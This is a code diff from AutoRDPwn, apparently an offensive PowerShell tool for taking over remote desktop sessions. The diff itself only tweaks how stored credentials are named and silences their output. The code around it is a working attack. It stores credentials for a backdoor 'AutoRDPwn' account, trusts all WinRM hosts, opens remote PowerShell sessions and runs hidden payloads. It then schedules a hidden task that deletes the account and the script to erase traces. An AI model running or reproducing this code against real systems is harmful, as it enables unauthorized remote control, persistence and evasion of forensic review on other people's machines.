@@ -412,7 +412,7 @@ function Remove-Exclusions {
         default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','3','4','5','6','7','X')
 
    if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force
-   cmdkey /generic:$computer /user:AutoRDPwn /pass:AutoRDPwn } ; $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
+   cmdkey /generic:$domain/$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null } ; $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
    Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
    if(!$user) { $RDP = New-PSSession -Computer $computer } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
    $RDP = New-PSSession -Computer $computer -credential $credential } ; $session = get-pssession ; if ($session){
@@ -490,7 +490,7 @@ if ($nogui){ Write-Host $txt66 -ForegroundColor Green ; Write-Host ; Write-Host 
 if ($createuser -like '-createuser') { $hash ="true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
 else { Write-Host $txt38 -ForegroundColor Red ; sleep -milliseconds 4000 }
 
-if ($hash){ cmdkey /del $computer ; invoke-command -session $RDP[0] -scriptblock {
+if ($hash){ cmdkey /del $domain/$computer 2>&1> $null ; invoke-command -session $RDP[0] -scriptblock {
 $script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
 echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
 $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
